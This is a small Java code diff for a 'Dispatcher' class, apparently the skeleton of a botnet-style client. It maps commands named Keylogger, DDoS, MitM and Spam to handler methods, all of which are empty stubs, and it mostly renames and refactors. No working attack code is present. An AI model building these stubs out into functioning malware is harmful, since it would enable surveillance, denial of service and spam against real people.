@@ -5,8 +5,6 @@ import java.util.Map;
  * Created by seth on 12/21/16.
  */
 
-enum Status {WAITING, RUNNING, DONE, ERROR};
-
 public class Dispatcher {
     private Map<String, Runnable> func;
     private Status status;
@@ -14,7 +12,7 @@ public class Dispatcher {
     public Dispatcher() {
         func = new HashMap<>();
         func.put("Keylogger", this::Keylogger);
-        func.put("DDoS", this::DDos);
+        func.put("DDoS", this::DDoS);
         func.put("MitM", this::MitM);
         func.put("Spam", this::Spam);
         func.put("Query", this::Query);
@@ -30,7 +28,7 @@ public class Dispatcher {
     private void MitM() {
     }
 
-    private void DDos() {
+    private void DDoS() {
     }
 
     private void Keylogger() {
@@ -38,11 +36,12 @@ public class Dispatcher {
 
     /**
      * Execute the given command on a new process.
-     * @param args the command and list of arguments.  args[0] is the command to execute and
-     *             args[1...args.length] are the arguments supplied to the command.
+     * @param command the full command requested by the caller including command name and arguments.
      * @return The status of the requested operation.
      */
-    public Status Dispatch(String[] args) {
+    public Status Dispatch(String command) {
+
         return status;
+
     }
 }
